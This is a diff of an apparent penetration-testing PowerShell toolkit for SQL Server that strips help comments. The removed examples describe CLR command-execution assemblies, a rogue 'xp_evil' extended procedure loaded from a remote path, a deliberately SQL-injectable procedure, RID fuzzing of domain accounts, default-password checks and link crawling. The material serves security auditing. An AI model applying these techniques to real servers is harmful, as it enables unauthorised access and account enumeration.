-            Connect using Dedicated Admin Connection.
-            .PARAMETER DatabaseName
-            Database name to filter for.
-            .PARAMETER DatabaseUser
-            Database user to filter for.            
-            .PARAMETER NoDefaults
-            Only show information for non default databases.
-            .PARAMETER ExportFolder
-            Folder to export CLR DLL files to.
-            .PARAMETER AssemblyName
-            Filter for assembly names that contain the provided word.
 
-            .EXAMPLE
-            Get CLR stored procedure information and export source DLLs to a folder as a sysadmin.
-            PS C:\> Get-SQLStoredProcedureCLR -Verbose -Instance SQLServer1\Instance1 -ExportFolder . | ft -AutoSize
-            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Connection Success.
-            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Grabbing assembly file information from master.
-            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Creating export folder: .\CLRExports
-            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Creating server folder: .\CLRExports\MSSQLSRV04_SQLSERVER2014
-            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Creating database folder: .\CLRExports\MSSQLSRV04_SQLSERVER2014\master
-            VERBOSE: MSSQLSRV04\SQLSERVER2014 : - Exporting adduser.dll
-            VERBOSE: MSSQLSRV04\SQLSERVER2014 : - Exporting CLRFile.dll
-            VERBOSE: MSSQLSRV04\SQLSERVER2014 : - Exporting runcmd.dll.dll
-
-            ComputerName Instance                 DatabaseName assembly_method assembly_id assembly_name file_id file_name   clr_name      
-            ------------ --------                 ------------ --------------- ----------- ------------- ------- ---------   --------      
-            MSSQLSRV04   MSSQLSRV04\SQLSERVER2014 testdb       readfile        65537       filetools     1       filetools   filetools, ve...
-            MSSQLSRV04   MSSQLSRV04\SQLSERVER2014 testdb       writefile       65537       filetools     1       filetools   filetools, ve...
-            MSSQLSRV04   MSSQLSRV04\SQLSERVER2014 testdb       runcmd          65558       runcmd        1       ostools     ostools,...            
-         
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLStoredProcedureCLR -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -9748,59 +8385,9 @@ Function  Get-SQLStoredProcedureCLR
 }
 
 
-# ----------------------------------
-#  Get-SQLStoredProcedure
-# ----------------------------------
-
 Function  Get-SQLStoredProcedure
 {
-    <#
-            .SYNOPSIS
-            Returns stored procedures from target SQL Servers.
-            Note: Viewing procedure definitions requires the sysadmin role or the VIEW DEFINITION permission.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER DatabaseName
-            Database name to filter for.
-            .PARAMETER ProcedureName
-            Procedure name to filter for.
-            .PARAMETER Keyword
-            Filter for procedures that include the keyword.
-            .PARAMETER AutoExec
-            Only select procedures that execute when the SQL Server service starts.
-            .PARAMETER NoDefaults
-            Filter out results from default databases.
-            .EXAMPLE
-            PS C:\> Get-SQLStoredProcedure -Instance SQLServer1\STANDARDDEV2014 -NoDefaults -DatabaseName testdb
 
-            ComputerName        : SQLServer1
-            Instance            : SQLServer1\STANDARDDEV2014
-            DatabaseName        : testdb
-            SchemaName          : dbo
-            ProcedureName       : MyTestProc
-            ProcedureType       : PROCEDURE
-            ProcedureDefinition : CREATE PROC MyTestProc
-                                  WITH EXECUTE AS OWNER
-                                  as
-                                  begin
-                                  select SYSTEM_USER as currentlogin, ORIGINAL_LOGIN() as originallogin
-                                  end
-            SQL_DATA_ACCESS     : MODIFIES
-            ROUTINE_BODY        : SQL
-            CREATED             : 7/24/2016 3:16:29 PM
-            LAST_ALTERED        : 7/24/2016 3:16:29 PM
-            is_ms_shipped       : False
-            is_auto_executed    : False
-
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Get-SQLStoredProcedure -Verbose -NoDefaults
-    #>
 
     [CmdletBinding()]
     Param(
@@ -9983,62 +8570,8 @@ Function  Get-SQLStoredProcedure
 }
 
 
-# ----------------------------------
-#  Get-SQLStoredProcedureXP
-# ----------------------------------
-
 Function  Get-SQLStoredProcedureXP
 {
-    <#
-            .SYNOPSIS
-            Returns custom extended stored procedures from target SQL Server databases.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER DatabaseName
-            Database name to filter for.
-            .PARAMETER ProcedureName
-            Procedure name to filter for.
-            .PARAMETER NoDefaults
-            Filter out results from default databases.
-            .EXAMPLE
-            PS C:\> Get-SQLStoredProcedureXP -Instance SQLServer1\STANDARDDEV2014 -DatabaseName master
-
-                    ComputerName        : SQLServer1
-                    Instance            : SQLServer1\STANDARDDEV2014
-                    DatabaseName        : master
-                    object_id           : 1559676604
-                    parent_object_id    : 0
-                    schema_id           : 1
-                    type                : X 
-                    type_desc           : EXTENDED_STORED_PROCEDURE
-                    name                : xp_evil
-                    principal_id        : 
-                    text                : \\acme.com@SSL\evilxp.txt
-                    ctext               : {92, 0, 92, 0...}
-                    status              : 0
-                    create_date         : 9/11/2017 11:36:06 AM
-                    modify_date         : 9/11/2017 11:36:06 AM
-                    is_ms_shipped       : False
-                    is_published        : False
-                    is_schema_published : False
-                    colid               : 1
-                    compressed          : False
-                    encrypted           : False
-                    id                  : 1559676604
-                    language            : 0
-                    number              : 0
-                    texttype            : 2
-
-
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Get-SQLStoredProcedureXP -Verbose 
-    #>
 
     [CmdletBinding()]
     Param(
@@ -10213,69 +8746,8 @@ Function  Get-SQLStoredProcedureXP
 }
 
 
-# ----------------------------------
-#  Get-SQLStoredProcedureSQLi
-# ----------------------------------
-
-# Todo: Add column Procedure_Owner_Name
-# Todo: Add column owner Owner_Is_Sysadmin
-# Todo: Add is_ms_shipped and is_auto_executed to signed proc query
 Function  Get-SQLStoredProcedureSQLi
 {
-    <#
-            .SYNOPSIS
-            Returns stored procedures containing dynamic SQL and concatenations that may suffer from SQL injection on target SQL Servers.
-            Note: Viewing procedure definitions requires the sysadmin role or the VIEW DEFINITION permission.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER DatabaseName
-            Database name to filter for.
-            .PARAMETER ProcedureName
-            Procedure name to filter for.
-            .PARAMETER Keyword
-            Filter for procedures that include the keyword.
-            .PARAMETER OnlySigned
-            Filter for signed procedures.
-            .PARAMETER AutoExec
-            Only select procedures that execute when the SQL Server service starts.
-            .PARAMETER NoDefaults
-            Filter out results from default databases.
-            .EXAMPLE
-            PS C:\> Get-SQLStoredProcedureSqli -Instance SQLServer1\STANDARDDEV2014 -NoDefaults -DatabaseName testdb
-
-            ComputerName        : SQLServer1
-            Instance            : SQLServer1\STANDARDDEV2014
-            DatabaseName        : testdb
-            SchemaName          : dbo
-            ProcedureName       : sp_sqli
-            ProcedureType       : PROCEDURE
-            ProcedureDefinition : -- Create procedure
-                                CREATE PROCEDURE sp_sqli
-                                @DbName varchar(max)
-                                WITH EXECUTE AS OWNER
-                                AS
-                                BEGIN
-                                Declare @query as varchar(max)
-                                SET @query = 'SELECT name FROM master..sysdatabases where name like ''%'+ @DbName+'%'' OR name=''tempdb''';
-                                EXECUTE(@query)
-                                END
-                                GO
-            SQL_DATA_ACCESS     : MODIFIES
-            ROUTINE_BODY        : SQL
-            CREATED             : 7/24/2016 3:16:29 PM
-            LAST_ALTERED        : 7/24/2016 3:16:29 PM
-            is_ms_shipped       : False
-            is_auto_executed    : False
-
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Get-SQLStoredProcedureSqli -Verbose -NoDefaults
-    #>
 
     [CmdletBinding()]
     Param(
@@ -10519,53 +8991,8 @@ Function  Get-SQLStoredProcedureSQLi
     }
 }
 
-# ----------------------------------
-#  Get-SQLStoredProcedureAutoExec
-# ----------------------------------
-
 Function  Get-SQLStoredProcedureAutoExec
 {
-    <#
-            .SYNOPSIS
-            Returns stored procedures from target SQL Servers.
-            Note: Viewing procedure definitions requires the sysadmin role or the VIEW DEFINITION permission.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER ProcedureName
-            Procedure name to filter for.
-            .PARAMETER Keyword
-            Filter for procedures that include the keyword.
-            .EXAMPLE
-            PS C:\> Get-SQLStoredProcedureAutoExec -Instance SQLServer1\STANDARDDEV2014 -NoDefaults -DatabaseName testdb
-
-            ComputerName        : SQLServer1
-            Instance            : SQLServer1\STANDARDDEV2014
-            DatabaseName        : testdb
-            SchemaName          : dbo
-            ProcedureName       : MyTestProc
-            ProcedureType       : PROCEDURE
-            ProcedureDefinition : CREATE PROC MyTestProc
-                                  WITH EXECUTE AS OWNER
-                                  as
-                                  begin
-                                  select SYSTEM_USER as currentlogin, ORIGINAL_LOGIN() as originallogin
-                                  end
-            SQL_DATA_ACCESS     : MODIFIES
-            ROUTINE_BODY        : SQL
-            CREATED             : 7/24/2016 3:16:29 PM
-            LAST_ALTERED        : 7/24/2016 3:16:29 PM
-            is_ms_shipped       : False
-            is_auto_executed    : TRUE
-
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Get-SQLStoredProcedureAutoExec -Verbose -NoDefaults
-    #>
 
     [CmdletBinding()]
     Param(
@@ -10710,63 +9137,9 @@ Function  Get-SQLStoredProcedureAutoExec
     }
 }
 
-
-#endregion
-
-#########################################################################
-#
-#region          UTILITY FUNCTIONS
-#
-#########################################################################
-
-
-# ----------------------------------
-#  Get-SQLAssemblyFile
-# ----------------------------------
-
 Function  Get-SQLAssemblyFile
 {
-    <#
-            .SYNOPSIS
-            Returns assembly file information for each database.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER DAC
-            Connect using Dedicated Admin Connection.
-            .PARAMETER DatabaseName
-            Database name to filter for.
-            .PARAMETER DatabaseUser
-            Database user to filter for.            
-            .PARAMETER NoDefaults
-            Only show information for non default databases.
-            .PARAMETER ExportFolder
-            Folder to export CLR DLL files to.
-            .PARAMETER AssemblyName
-            Filter for assembly names that contain the provided word.
 
-            .EXAMPLE
-            PS C:\> Get-SQLAssemblyFile -Verbose -Instance SQLServer1\Instance1 | ft -AutoSize
-            VERBOSE: SQLServer1\Instance1 : Connection Success.
-            VERBOSE: SQLServer1\Instance1 : Grabbing assembly file information from master.
-            VERBOSE: SQLServer1\Instance1 : Grabbing assembly file information from tempdb.
-            VERBOSE: SQLServer1\Instance1 : Grabbing assembly file information from msdb.
-
-            ComputerName Instance                 DatabaseName assembly_id name                          file_id content                  
-            ------------ --------                 ------------ ----------- ----                          ------- -------                  
-            MSSQLSRV04   SQLServer1\Instance1 master       1           microsoft.sqlserver.types.dll 1       77 90 144 0 3 0 0 0 4 ...
-            MSSQLSRV04   SQLServer1\Instance1 tempdb       1           microsoft.sqlserver.types.dll 1       77 90 144 0 3 0 0 0 4 ...
-            MSSQLSRV04   SQLServer1\Instance1 msdb         1           microsoft.sqlserver.types.dll 1       77 90 144 0 3 0 0 0 4 ...
-
-         
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLAssemblyfile -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -10975,40 +9348,9 @@ Function  Get-SQLAssemblyFile
 }
 
 
-# ----------------------------------
-#  Get-SQLFuzzObjectName
-# ----------------------------------
-
-# Reference: https://raresql.com/2013/01/29/sql-server-all-about-object_id/
-# Reference: https://social.technet.microsoft.com/Forums/forefront/en-US/f73c2115-57f7-4cec-a95b-00c2d8252ace/objectid-recycled-?forum=transactsql
 Function  Get-SQLFuzzObjectName
 {
-    <#
-            .SYNOPSIS
-            Enumerates objects based on object id using OBJECT_NAME() and only the Public role.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER StartId
-            Principal ID to start fuzzing with.
-            .PARAMETER EndId
-            Principal ID to stop fuzzing with.
-            .EXAMPLE
-            PS C:\> Get-SQLFuzzObjectName -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 5
 
-            ComputerName   Instance                       ObjectId ObjectName
-            ------------   --------                       -------- ----------
-            SQLServer1     SQLServer1\STANDARDDEV2014     3        sysrscols
-            SQLServer1     SQLServer1\STANDARDDEV2014     5        sysrowsets
-            SQLServer1     SQLServer1\STANDARDDEV2014     6        sysclones
-            SQLServer1     SQLServer1\STANDARDDEV2014     7        sysallocunits
-            SQLServer1     SQLServer1\STANDARDDEV2014     8        sysfiles1
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -11134,38 +9476,8 @@ Function  Get-SQLFuzzObjectName
 }
 
 
-# ----------------------------------
-#  Get-SQLFuzzDatabaseName
-# ----------------------------------
-
 Function  Get-SQLFuzzDatabaseName
 {
-    <#
-            .SYNOPSIS
-            Enumerates databases based on database id using DB_NAME() and only the Public role.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER StartId
-            Principal ID to start fuzzing with.
-            .PARAMETER EndId
-            Principal ID to stop fuzzing with.
-            .EXAMPLE
-            PS C:\> Get-SQLFuzzDatabaseName -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 5
-
-            ComputerName   Instance                       DatabaseId DatabaseName
-            ------------   --------                       ---------- ------------
-            SQLServer1     SQLServer1\STANDARDDEV2014     1          master
-            SQLServer1     SQLServer1\STANDARDDEV2014     2          tempdb
-            SQLServer1     SQLServer1\STANDARDDEV2014     3          model
-            SQLServer1     SQLServer1\STANDARDDEV2014     4          msdb
-            SQLServer1     SQLServer1\STANDARDDEV2014     5          ReportServer$STANDARDDEV2014
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -11282,73 +9594,8 @@ Function  Get-SQLFuzzDatabaseName
 }
 
 
-# ----------------------------------
-#  Get-SQLFuzzServerLogin
-# ----------------------------------
-
 Function  Get-SQLFuzzServerLogin
 {
-    <#
-            .SYNOPSIS
-            Enumerates SQL Server Logins based on login id using SUSER_NAME() and only the Public role.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER FuzzNum
-            The number of Principal IDs to fuzz during blind SQL login enumeration as a least privilege login.
-            .PARAMETER GetRole
-            Checks if the principal name is a role, SQL login, or Windows account.
-            .EXAMPLE
-            PS C:\> Get-SQLFuzzServerLogin -Instance SQLServer1\STANDARDDEV2014 -StartId 1 -EndId 500 | Select-Object -First 40
-
-            ComputerName   Instance                       PrincipalId PrincipleName
-            ------------   --------                       ----------  -------------
-            SQLServer1     SQLServer1\STANDARDDEV2014     1           sa
-            SQLServer1     SQLServer1\STANDARDDEV2014     2           public
-            SQLServer1     SQLServer1\STANDARDDEV2014     3           sysadmin
-            SQLServer1     SQLServer1\STANDARDDEV2014     4           securityadmin
-            SQLServer1     SQLServer1\STANDARDDEV2014     5           serveradmin
-            SQLServer1     SQLServer1\STANDARDDEV2014     6           setupadmin
-            SQLServer1     SQLServer1\STANDARDDEV2014     7           processadmin
-            SQLServer1     SQLServer1\STANDARDDEV2014     8           diskadmin
-            SQLServer1     SQLServer1\STANDARDDEV2014     9           dbcreator
-            SQLServer1     SQLServer1\STANDARDDEV2014     10          bulkadmin
-            SQLServer1     SQLServer1\STANDARDDEV2014     101         ##MS_SQLResourceSigningCertificate##
-            SQLServer1     SQLServer1\STANDARDDEV2014     102         ##MS_SQLReplicationSigningCertificate##
-            SQLServer1     SQLServer1\STANDARDDEV2014     103         ##MS_SQLAuthenticatorCertificate##
-            SQLServer1     SQLServer1\STANDARDDEV2014     105         ##MS_PolicySigningCertificate##
-            SQLServer1     SQLServer1\STANDARDDEV2014     106         ##MS_SmoExtendedSigningCertificate##
-            SQLServer1     SQLServer1\STANDARDDEV2014     121         ##Agent XPs##
-            SQLServer1     SQLServer1\STANDARDDEV2014     122         ##SQL Mail XPs##
-            SQLServer1     SQLServer1\STANDARDDEV2014     123         ##Database Mail XPs##
-            SQLServer1     SQLServer1\STANDARDDEV2014     124         ##SMO and DMO XPs##
-            SQLServer1     SQLServer1\STANDARDDEV2014     125         ##Ole Automation Procedures##
-            SQLServer1     SQLServer1\STANDARDDEV2014     126         ##Web Assistant Procedures##
-            SQLServer1     SQLServer1\STANDARDDEV2014     127         ##xp_cmdshell##
-            SQLServer1     SQLServer1\STANDARDDEV2014     128         ##Ad Hoc Distributed Queries##
-            SQLServer1     SQLServer1\STANDARDDEV2014     129         ##Replication XPs##
-            SQLServer1     SQLServer1\STANDARDDEV2014     257         ##MS_PolicyTsqlExecutionLogin##
-            SQLServer1     SQLServer1\STANDARDDEV2014     259         Domain\User
-            SQLServer1     SQLServer1\STANDARDDEV2014     260         NT SERVICE\SQLWriter
-            SQLServer1     SQLServer1\STANDARDDEV2014     261         NT SERVICE\Winmgmt
-            SQLServer1     SQLServer1\STANDARDDEV2014     262         NT Service\MSSQL$STANDARDDEV2014
-            SQLServer1     SQLServer1\STANDARDDEV2014     263         NT AUTHORITY\SYSTEM
-            SQLServer1     SQLServer1\STANDARDDEV2014     264         NT SERVICE\SQLAgent$STANDARDDEV2014
-            SQLServer1     SQLServer1\STANDARDDEV2014     265         NT SERVICE\ReportServer$STANDARDDEV2014
-            SQLServer1     SQLServer1\STANDARDDEV2014     266         ##MS_PolicyEventProcessingLogin##
-            SQLServer1     SQLServer1\STANDARDDEV2014     267         ##MS_AgentSigningCertificate##
-            SQLServer1     SQLServer1\STANDARDDEV2014     268         MySQLUser1
-            SQLServer1     SQLServer1\STANDARDDEV2014     270         MySQLUser2
-            SQLServer1     SQLServer1\STANDARDDEV2014     271         MySQLUser3
-            SQLServer1     SQLServer1\STANDARDDEV2014     272         MySysadmin1
-            SQLServer1     SQLServer1\STANDARDDEV2014     273         Domain\User2
-            SQLServer1     SQLServer1\STANDARDDEV2014     274         MySysadmin2
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -11507,69 +9754,9 @@ Function  Get-SQLFuzzServerLogin
 }
 
 
-# ----------------------------------
-#  Get-SQLFuzzDomainAccount
-# ----------------------------------
-
 Function  Get-SQLFuzzDomainAccount
 {
-    <#
-            .SYNOPSIS
-            Enumerates domain groups, computer accounts, and user accounts based on domain RID using SUSER_SNAME() and only the Public role.
-            Note: In a typical domain 10000 or more is recommended for the EndId.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER Domain
-            Set a custom domain for user enumeration. Typically used to target trusted domains.
-            .PARAMETER StartId
-            RID to start fuzzing with.
-            .PARAMETER EndId
-            RID to stop fuzzing with.
-            .EXAMPLE
-            PS C:\> Get-SQLFuzzDomainAccount -Instance SQLServer1\STANDARDDEV2014 -Verbose -StartId 500 -EndId 1500 -Domain TrustedDomainName
-            .EXAMPLE
-            PS C:\> Get-SQLFuzzDomainAccount -Instance SQLServer1\STANDARDDEV2014 -Verbose -StartId 500 -EndId 1500
-
-            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
-            VERBOSE: SQLServer1\STANDARDDEV2014 : Enumerating Domain accounts from the SQL Server's default domain...
-            VERBOSE: SQLServer1\STANDARDDEV2014 : RID 0x010500000000000515000000A132413243431431326051C0f4010000 (500) Resolved to: Domain\Administrator
-            VERBOSE: SQLServer1\STANDARDDEV2014 : RID 0x010500000000000515000000A132413243431431326051C0f5010000 (501) Resolved to: Domain\Guest
-            VERBOSE: SQLServer1\STANDARDDEV2014 : RID 0x010500000000000515000000A132413243431431326051C0f6010000 (502) Resolved to: Domain\krbtgt
-            [TRUNCATED]
-
-            ComputerName   Instance                       DomainAccount
-            ------------   --------                       -------------
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Administrator
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Guest
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\krbtgt
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Domain Guests
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Domain Computers
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Domain Controllers
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Cert Publishers
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Schema Admins
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Enterprise Admins
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Group Policy Creator Owners
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Read-only Domain Controllers
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Cloneable Domain Controllers
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Protected Users
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\RAS and IAS Servers
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Allowed RODC Password Replication Group
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Denied RODC Password Replication Group
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\HelpServicesGroup
-
-            [TRUNCATED]
-
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\MyUser
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\MyDAUser
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\MyEAUser
-    #>
-    [CmdletBinding()]
+   [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
                 ValueFromPipelineByPropertyName = $true,
@@ -11738,21 +9925,10 @@ Function  Get-SQLFuzzDomainAccount
 }
 
 
-# -------------------------------------------
-# Function: Get-ComputerNameFromInstance
-# ------------------------------------------
 
 Function Get-ComputerNameFromInstance
 {
-    <#
-            .SYNOPSIS
-            Parses computer name from a provided instance.
-            .PARAMETER Instance
-            SQL Server instance to parse.
-            .EXAMPLE
-            PS C:\> Get-ComputerNameFromInstance -Instance SQLServer1\STANDARDDEV2014
-            SQLServer1
-    #>
+
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -11778,40 +9954,7 @@ Function Get-ComputerNameFromInstance
 
 Function  Get-SQLServiceLocal
 {
-    <#
-            .SYNOPSIS
-            Returns local SQL Server services using Get-WmiObject -Class win32_service. This can only be run against the local server.
-            .PARAMETER Instance
-            SQL Server instance to filter for.
-            .PARAMETER RunOnly
-            Filter for running services.
-            .EXAMPLE
-            PS C:\> Get-SQLServiceLocal -Instance SQLServer1\SQL2014 | Format-Table -AutoSize
-            .EXAMPLE
-            PS C:\> Get-SQLServiceLocal | Format-Table -AutoSize
 
-            ComputerName   ServiceDisplayName                                     ServiceName                              ServicePath
-            ------------   ------------------                                     -----------                              -----------
-            SQLServer1     SQL Server Integration Services 12.0                   MsDtsServer120                           "C:\Program Files\Microsoft SQL Server\120\DTS\Binn\MsDt...
-            SQLServer1     SQL Server Analysis Services (STANDARDDEV2014)         MSOLAP$STANDARDDEV2014                   "C:\Program Files\Microsoft SQL Server\MSAS12.STANDARDDE...
-            SQLServer1     SQL Server (SQLEXPRESS)                                MSSQL$SQLEXPRESS                         "C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRES...
-            SQLServer1     SQL Server (STANDARDDEV2014)                           MSSQL$STANDARDDEV2014                    "C:\Program Files\Microsoft SQL Server\MSSQL12.STANDARDD...
-            SQLServer1     SQL Full-text Filter Daemon Launcher (MSSQLSERVER)     MSSQLFDLauncher                          "C:\Program Files\Microsoft SQL Server\MSSQL12.MSSQLSERV...
-            SQLServer1     SQL Full-text Filter Daemon Launcher (SQLEXPRESS)      MSSQLFDLauncher$SQLEXPRESS               "C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRES...
-            SQLServer1     SQL Full-text Filter Daemon Launcher (STANDARDDEV2014) MSSQLFDLauncher$STANDARDDEV2014          "C:\Program Files\Microsoft SQL Server\MSSQL12.STANDARDD...
-            SQLServer1     SQL Server (MSSQLSERVER)                               MSSQLSERVER                              "C:\Program Files\Microsoft SQL Server\MSSQL12.MSSQLSERV...
-            SQLServer1     SQL Server Analysis Services (MSSQLSERVER)             MSSQLServerOLAPService                   "C:\Program Files\Microsoft SQL Server\MSAS12.MSSQLSERVE...
-            SQLServer1     SQL Server Reporting Services (MSSQLSERVER)            ReportServer                             "C:\Program Files\Microsoft SQL Server\MSRS12.MSSQLSERVE...
-            SQLServer1     SQL Server Reporting Services (SQLEXPRESS)             ReportServer$SQLEXPRESS                  "C:\Program Files\Microsoft SQL Server\MSRS12.SQLEXPRESS...
-            SQLServer1     SQL Server Reporting Services (STANDARDDEV2014)        ReportServer$STANDARDDEV2014             "C:\Program Files\Microsoft SQL Server\MSRS12.STANDARDDE...
-            SQLServer1     SQL Server Distributed Replay Client                   SQL Server Distributed Replay Client     "C:\Program Files (x86)\Microsoft SQL Server\120\Tools\D...
-            SQLServer1     SQL Server Distributed Replay Controller               SQL Server Distributed Replay Controller "C:\Program Files (x86)\Microsoft SQL Server\120\Tools\D...
-            SQLServer1     SQL Server Agent (SQLEXPRESS)                          SQLAgent$SQLEXPRESS                      "C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRES...
-            SQLServer1     SQL Server Agent (STANDARDDEV2014)                     SQLAgent$STANDARDDEV2014                 "C:\Program Files\Microsoft SQL Server\MSSQL12.STANDARDD...
-            SQLServer1     SQL Server Browser                                     SQLBrowser                               "C:\Program Files (x86)\Microsoft SQL Server\90\Shared\s...
-            SQLServer1     SQL Server Agent (MSSQLSERVER)                         SQLSERVERAGENT                           "C:\Program Files\Microsoft SQL Server\MSSQL12.MSSQLSERV...
-            SQLServer1     SQL Server VSS Writer                                  SQLWriter                                "C:\Program Files\Microsoft SQL Server\90\Shared\sqlwrit...
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -11922,37 +10065,9 @@ Function  Get-SQLServiceLocal
     }
 }
 
-
-
-
-# ----------------------------------
-#  Get-SQLServerLoginDefaultPw
-# ----------------------------------
-
-# Reference: https://github.com/pwnwiki/pwnwiki.github.io/blob/master/tech/db/mssql.md
 Function  Get-SQLServerLoginDefaultPw
 {
-    <#
-            .SYNOPSIS
-            Based on the instance name, test if SQL Server is configured with default passwords.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .EXAMPLE
-            PS C:\> Get-SQLServerLoginDefaultPw -Instance SQLServer1\STANDARDDEV2014
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLServerLoginDefaultPw -Verbose
-            VERBOSE: SQLServer1\SQLEXPRESS : Confirmed instance match.
-            VERBOSE: SQLServer1\SQLEXPRESS : No credential matches were found.
-            VERBOSE: SQLServer1\STANDARDDEV2014 : Confirmed instance match.
-            VERBOSE: SQLServer1\STANDARDDEV2014 : Confirmed default credentials - test/test
-            VERBOSE: SQLServer1 : No instance match found.
 
-            Computer       Instance                       Username Password IsSysadmin
-            --------       --------                       -------- -------- --------
-            SQLServer1     SQLServer1\STANDARDDEV2014     test     test      No
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLDomain | Get-SQLServerLoginDefaultPw -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -12122,53 +10237,7 @@ Function  Get-SQLServerLoginDefaultPw
 }
 
 Function Get-SQLServerLinkCrawl{
-    <#
-    .SYNOPSIS
-    Get-SQLServerLinkCrawl attempts to enumerate and follow MSSQL database links.
-    .DESCRIPTION
-    Get-SQLServerLinkCrawl attempts to enumerate and follow MSSQL database links. The function enumerates database names, versions, and links,
-    and then enumerates the MSSQL user and the privileges that the link path has.
-    .EXAMPLE
-    Get-SQLServerLinkCrawl -Instance "servername\instancename"
-    .PARAMETER Username
-    SQL Server or domain account to authenticate with.
-    .PARAMETER Password
-    SQL Server or domain account password to authenticate with.
-    .PARAMETER Credential
-    Windows credentials.
-    .PARAMETER Instance
-    SQL Server instance to connection to.
-    .PARAMETER DAC
-    Dedicated Administrator Connection (DAC).
-    .PARAMETER TimeOut
-    Connection timeout.
-    .PARAMETER Query
-    Custom SQL query to run. If QueryTarget isn's given, this will run on each server.
-    PARAMETER QueryTarget
-    Link to run SQL query on.
-    .PARAMETER Export
-    Convert collected data to exportable format.
-    .Example
-    Crawl linked servers and return a list of databases for each one in a readable format.
-    Get-SQLServerLinkCrawl -instance "10.2.9.101\SQLSERVER2008" -username 'guest' -password 'guest' | where Instance -ne "Broken Link" |
-    foreach-object { Get-SQLQuery -instance "10.2.9.101\SQLSERVER2008" -username 'guest' -password 'guest' -Query (get-SQLServerLinkQuery -Path $_.Path -Sql 'select system_user')}
-    .Example
